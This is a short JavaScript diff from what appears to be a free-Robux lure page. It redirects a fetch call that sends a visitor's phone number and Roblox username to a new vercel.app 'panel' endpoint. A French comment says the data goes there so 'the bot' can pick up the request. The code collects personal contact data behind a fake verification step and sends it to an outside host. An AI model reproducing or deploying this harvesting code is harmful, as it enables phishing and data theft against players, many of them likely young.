@@ -87,7 +87,7 @@
           verify.style.display = 'flex';
           // Envoi des infos vers le panel pour que le bot capte la demande
           try {
-            await fetch('https://panel-robux-social.vercel.app/api/requests', {
+            await fetch('https://robux-32k1.vercel.app/api/requests', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({ phone: phone.value, username: usernameInput.value.trim() })
